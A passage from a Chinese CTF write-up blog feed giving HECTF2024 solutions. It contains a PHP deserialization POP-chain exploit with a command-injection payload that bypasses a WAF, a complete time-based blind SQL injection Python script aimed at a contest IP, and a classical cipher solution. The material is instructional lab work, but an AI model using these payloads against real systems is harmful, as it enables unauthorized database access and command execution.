class="hljs-title">class02</span></span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$payload</span>;<br> &#125;<br> <br> <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>);<br> <span class="hljs-variable">$a</span>-&gt;token = <span class="hljs-string">&quot;admin&quot;</span>;<br> <span class="hljs-variable">$a</span>-&gt;msg = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class01</span>();<br> <span class="hljs-variable">$a</span>-&gt;msg-&gt;cls = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class00</span>();<br> <span class="hljs-variable">$a</span>-&gt;msg-&gt;str3 = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class02</span>();<br> <span class="hljs-variable">$a</span>-&gt;msg-&gt;str3-&gt;payload = <span class="hljs-string">&quot;payload&quot;</span>;<br> <br> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><br> <span class="hljs-comment">//O:4:&quot;User&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:7:&quot;payload&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span><br><br></code></pre></td></tr></table></figure><p>在观察页面php版本为5.4存在成员个数不同绕过__wakeup的方法<br>直接修改payload</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">    <span class="hljs-operator">//</span><span class="hljs-built_in">O</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;User&quot;</span><span class="hljs-operator">:</span><span class="hljs-number">6</span><span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;name&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">5</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">6</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;passwd&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">6</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;123456&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">5</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;token&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">5</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;msg&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">O</span><span class="hljs-operator">:</span><span class="hljs-number">7</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;class01&quot;</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;temp&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">i</span><span class="hljs-operator">:</span><span class="hljs-number">0</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;str3&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">O</span><span class="hljs-operator">:</span><span class="hljs-number">7</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;class02&quot;</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">7</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;payload&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">7</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;payload&quot;</span><span class="hljs-operator">;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;cls&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">O</span><span class="hljs-operator">:</span><span class="hljs-number">7</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;class00&quot;</span><span class="hljs-operator">:</span><span class="hljs-number">0</span><span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br>    <br>    <span class="hljs-operator">//</span><span class="hljs-variable">Ly9POjQ6IlVzZXIiOjY6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7czo2OiJwYXNzd2QiO3M6NjoiMTIzNDU2IjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjtzOjM6Im1zZyI7Tzo3OiJjbGFzczAxIjozOntzOjQ6InRlbXAiO2k6MDtzOjQ6InN0cjMiO086NzoiY2xhc3MwMiI6MTp7czo3OiJwYXlsb2FkIjtzOjc6InBheWxvYWQiO31zOjM6ImNscyI7Tzo3OiJjbGFzczAwIjowOnt9fX0</span><span class="hljs-operator">=</span><br><br><br>​    <br></code></pre></td></tr></table></figure><p>接下来就是分析WAF发现他过滤了绝大部分函数并且将输出和错误重定向到了“黑洞”,这里我们发现他没有过滤[]那么就可以用正则匹配绕过过滤&#x2F;bin&#x2F;ca[t]匹配cat命令，然后用||来绕过“黑洞”就可以回显flag了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-regexp">/bin/</span>ca[t] /fla[g] ||<br><br> <span class="hljs-regexp">//</span>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">6</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;passwd&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;msg&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;class01&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;temp&quot;</span>;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;str3&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;class02&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;payload&quot;</span>;s:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;/bin/ca[t] /fla[g] ||&quot;</span>;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cls&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;class00&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;&#125;&#125;<br> <br> <span class="hljs-regexp">//</span>Tzo0OiJVc2VyIjo2OntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjY6IjEyMzQ1NiI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7czozOiJtc2ciO086NzoiY2xhc3MwMSI6Mzp7czo0OiJ0ZW1wIjtpOjA7czo0OiJzdHIzIjtPOjc6ImNsYXNzMDIiOjE6e3M6NzoicGF5bG9hZCI7czoyMToiL2Jpbi9jYVt0XSAvZmxhW2ddIHx8Ijt9czozOiJjbHMiO086NzoiY2xhc3MwMCI6MDp7fX19Cg==<br><br></code></pre></td></tr></table></figure></li></ol><h2 id="HECTF2024-baby-sql"><a href="#HECTF2024-baby-sql" class="headerlink" title="[HECTF2024]baby_sql"></a>[HECTF2024]baby_sql</h2><p style="font-size:10px;color:#7f8c93">题目来源：HECTF<br>题目类型：WEB<br>设计考点：SQL布尔盲注</p>    首先万能密码进入后台    1' or 1=1#    然后发现题目不会回显报错，并且只会回显某人今天打卡了和找不到此人，那么就采用布尔盲注的方法爆破，构造payload时发现information.schema被过滤了那么就用mysql.innodb_table_stats绕过但是这张表里没有列名就暗示后面需要用无列名注入，我们构造脚本爆破数据库   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-comment">#测试的时候服务器有点问题，爆破的时候总是要出问题，建议每一个函数多跑几次保证成功率，或者每次多修改一些time和sleep的时长保证正确率</span><br>    <span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> post<br>    <span class="hljs-keyword">import</span> string<br>    <span class="hljs-keyword">import</span> time<br>    <br>    alpha = <span class="hljs-string">&quot;&quot;&quot;&#123;_&#125;[]-&quot;&quot;&quot;</span> + string.ascii_letters + string.digits<br>    url = <span class="hljs-string">&quot;http://154.64.254.169:33113/worker.php&quot;</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">istime</span>(<span class="hljs-params">data</span>):<br>        <span class="hljs-keyword">try</span>:<br>            resp = post(url,data=data,timeout=<span class="hljs-number">20</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;not&quot;</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;timeout&quot;</span><br><br><br>    <span class="hljs-comment"># 数据库长度为：7</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">db_name_len</span>():<br>    i = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">&quot;g01den&#x27;/**/or/**/if((select/**/length(database()))/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>        data = &#123;<span class="hljs-string">&quot;name&quot;</span>:payload&#125;<br>        <span class="hljs-comment"># print(payload)</span><br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">if</span> istime(data) == <span class="hljs-string">&quot;timeout&quot;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库长度为：%d&quot;</span>%i)<br>            <span class="hljs-keyword">return</span> i<br>        i += <span class="hljs-number">1</span><br><br><br>    <span class="hljs-comment">#数据库名为greatsql</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">db_name</span>():<br>        name = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> alpha:<br>                payload = <span class="hljs-string">&quot;g01den&#x27;/**/Or/**/if(substr(database(),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;,sLeep(20),sLeep(0))#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>                data = &#123;<span class="hljs-string">&quot;name&quot;</span>: payload&#125;<br>                time.sleep(<span class="hljs-number">0.3</span>)<br>                <span class="hljs-keyword">if</span> istime(data) == <span class="hljs-string">&quot;timeout&quot;</span>:<br>                    name += j<br>                    <span class="hljs-keyword">break</span><br>       <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库的名字是&quot;</span>+name)<br>    <span class="hljs-keyword">return</span> name<br><br><br>    <span class="hljs-comment"># 数据库的个数为4</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db_name_count</span>():<br>    i = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">&quot;g01den&#x27;/**/Or/**/if((seLect/**/COUNT(database_name)/**/fRom/**/mysql.innodb_table_stats)/**/like/**/&#123;&#125;,sLeep(20),sLeep(0))#&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>        data = &#123;<span class="hljs-string">&quot;name&quot;</span>: payload&#125;<br>        <span class="hljs-comment"># print(payload)</span><br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">if</span> istime(data) == <span class="hljs-string">&quot;timeout&quot;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库的个数为&quot;</span>+<span class="hljs-built_in">str</span>(i))<br>            <span class="hljs-keyword">return</span> i<br>        i += <span class="hljs-number">1</span><br><br><br>    <span class="hljs-comment"># [10, 5, 5, 7]</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">db_name_len_list</span>():<br>        name_len_list = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">4</span>):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>):<br>                payload = <span class="hljs-string">&quot;g01den&#x27;/**/Or/**/if((select/**/length(database_name)/**/from/**/mysql.innodb_table_stats/**/limit/**/&#123;&#125;,1)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>                data = &#123;<span class="hljs-string">&quot;name&quot;</span>: payload&#125;<br>                <span class="hljs-comment"># print(payload)</span><br>                time.sleep(<span class="hljs-number">0.3</span>)<br>                <span class="hljs-keyword">if</span> istime(data) == <span class="hljs-string">&quot;timeout&quot;</span>:<br>                    name_len_list.append(j)<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(name_len_list)<br>        <span class="hljs-keyword">return</span> name_len_list<br>    <br>    <span class="hljs-comment"># 上一个查询结果为四次，所以手动查四次，没跑完一次，修改limit后面的参数，以及第一层for循环的参数</span><br>    <span class="hljs-comment"># flag1shere</span><br>    <span class="hljs-comment"># mysql</span><br>    <span class="hljs-comment"># users</span><br>    <span class="hljs-comment"># workers</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">db_name_list</span>():<br>        name = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> alpha:<br>                payload = <span class="hljs-string">&quot;g01den&#x27;/**/Or/**/if((select/**/substr(database_name,&#123;&#125;,1)/**/from/**/mysql.innodb_table_stats/**/limit/**/3,1)/**/like/**/&#x27;&#123;&#125;&#x27;,sLeep(20),sLeep(0))#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>                data = &#123;<span class="hljs-string">&quot;name&quot;</span>: payload&#125;<br>                <span class="hljs-comment"># print(payload)</span><br>                time.sleep(<span class="hljs-number">0.3</span>)<br>                <span class="hljs-keyword">if</span> istime(data) == <span class="hljs-string">&quot;timeout&quot;</span>:<br>                    name += j<br>                    time.sleep(<span class="hljs-number">2</span>)<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(name)<br>        <span class="hljs-keyword">return</span> name<br>    <br>    <span class="hljs-comment"># 当前数据库的表有2</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tb_count</span>():<br>    i = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">&quot;g01den&#x27;/**/Or/**/if((select/**/count(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;)/**/like/**/&#123;&#125;,sleep(20),sLeep(0))#&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>        data = &#123;<span class="hljs-string">&quot;name&quot;</span>: payload&#125;<br>        <span class="hljs-comment"># print(payload)</span><br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">if</span> istime(data) == <span class="hljs-string">&quot;timeout&quot;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;当前数据库的表有&quot;</span>+<span class="hljs-built_in">str</span>(i))<br>            <span class="hljs-keyword">return</span> i<br>        i += <span class="hljs-number">1</span><br>    <br>    <span class="hljs-comment"># 因为测出来有两个表，所以需要查两次</span><br>    <span class="hljs-comment"># 当前数据库表名长度为36</span><br>    <span class="hljs-comment"># 当前数据库表名长度为8</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tb_name_len</span>():<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">&quot;g01den&#x27;/**/Or/**/if((select/**/length(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;/**/limit/**/0,1)/**/like/**/&#123;&#125;,sleep(20),sLeep(0))#&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>        data = &#123;<span class="hljs-string">&quot;name&quot;</span>: payload&#125;<br>        <span class="hljs-comment"># print(payload)</span><br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        <span class="hljs-keyword">if</span> istime(data) == <span class="hljs-string">&quot;timeout&quot;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;当前数据库表名长度为&quot;</span> + <span class="hljs-built_in">str</span>(i))<br>            <span class="hljs-keyword">return</span> i<br>        i += <span class="hljs-number">1</span><br><br><br>    <span class="hljs-comment"># 因为存在两张表，所以得查两次</span><br>    <span class="hljs-comment"># flag_is_in_flag1shere_loockhere_flag</span><br>    <span class="hljs-comment"># flag</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tb_name</span>():<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">37</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> alpha:<br>            payload = <span class="hljs-string">&quot;g01den&#x27;/**/Or/**/if((select/**/substr(table_name,&#123;&#125;,1)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;/**/limit/**/0,1)/**/in/**/(&#x27;&#123;&#125;&#x27;),sleep(20),sleep(0))#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>            data = &#123;<span class="hljs-string">&quot;name&quot;</span>: payload&#125;<br>            <span class="hljs-comment"># print(payload)</span><br>            time.sleep(<span class="hljs-number">0.5</span>)<br>            <span class="hljs-keyword">if</span> istime(data) == <span class="hljs-string">&quot;timeout&quot;</span>:<br>                <span class="hljs-built_in">print</span>(j,end=<span class="hljs-string">&quot;&quot;</span>)<br>                name += j<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(name)<br>    <span class="hljs-keyword">return</span> name<br>    <br>    <span class="hljs-comment"># 数据库的数据个数为1</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">flag_count</span>():<br>    i = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">&quot;g01den&#x27;/**/or/**/if((select/**/count(flag)/**/from/**/flag1shere.lookhere)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>        data = &#123;<span class="hljs-string">&quot;name&quot;</span>: payload&#125;<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">if</span> istime(data) == <span class="hljs-string">&quot;timeout&quot;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库的数据个数为&quot;</span>+<span class="hljs-built_in">str</span>(i))<br>            <span class="hljs-keyword">return</span> i<br>        i += <span class="hljs-number">1</span><br>    <br>    <span class="hljs-comment"># flag的长度为32</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">flag_name_len</span>():<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">&quot;g01den&#x27;/**/or/**/if((select/**/length(flag)/**/from/**/flag1shere.lookhere)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>        data = &#123;<span class="hljs-string">&quot;name&quot;</span>: payload&#125;<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">if</span> istime(data) == <span class="hljs-string">&quot;timeout&quot;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag的长度为&quot;</span> + <span class="hljs-built_in">str</span>(i))<br>            <span class="hljs-keyword">return</span> i<br>        i += <span class="hljs-number">1</span><br>    <br>    <span class="hljs-comment"># hectf&#123;fl4g_1s_h5r5_n1ce_try_4_u&#125;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">flag_get</span>():<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">34</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> alpha:<br>            payload = <span class="hljs-string">&quot;g01den&#x27;/**/or/**/if((select/**/substr(flag,&#123;&#125;,1)/**/from/**/flag1shere.lookhere)/**/in/**/(&#x27;&#123;&#125;&#x27;),sleep(20),sleep(0))#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>            data = &#123;<span class="hljs-string">&quot;name&quot;</span>: payload&#125;<br>            <span class="hljs-built_in">print</span>(payload)<br>            time.sleep(<span class="hljs-number">0.5</span>)<br>            <span class="hljs-keyword">if</span> istime(data) == <span class="hljs-string">&quot;timeout&quot;</span>:<br>                flag += j<br>                <span class="hljs-built_in">print</span>(flag)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(flag)<br>    <span class="hljs-keyword">return</span> flag<br><br><br></code></pre></td></tr></table></figure><h2 id="HECTF2024-迷茫的艾米莉"><a href="#HECTF2024-迷茫的艾米莉" class="headerlink" title="[HECTF2024]迷茫的艾米莉"></a>[HECTF2024]迷茫的艾米莉</h2><p style="font-size:10px;color:#7f8c93">题目来源：HECTF<br>题目类型：Crypto<br>设计考点：栅栏密码，维吉尼亚密码</p><p>题目描述：迷茫的艾米莉 描述：在维吉尼亚小镇，园丁艾米莉的responsibility是照顾一座古老花园，每天修剪六段绿篱栅栏。一天，她 发现通往秘密花园的小径，入口却被封上了，上面有一串密文Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr，请输入密码帮助艾米莉探索秘密花园</p><p>根据提示这是一串栅栏密码，W型KEY为6，解密得到</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">YIUIT</span><span class="hljs-template-variable">&#123;P0fo2bb51lbbmew_0f_rczav9_jv&#125;</span><br></code></pre></td></tr></table></figure><p>显然还不是flag，那么就要继续尝试<br>发现题干有responsibility一串字样，猜测可能为某个KEY，最会发现是</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">key:</span> responsibility<br><br>HECTF&#123;C0ng2at51ations_0n_comin9_in&#125;<br><br>维吉尼亚密码<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题日记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF 2020_easy_md5题解</title>
    <link href="/2024/07/28/%5BBJDCTF%202020%5Deasy_md5/"/>
    <url>/2024/07/28/%5BBJDCTF%202020%5Deasy_md5/</url>
    
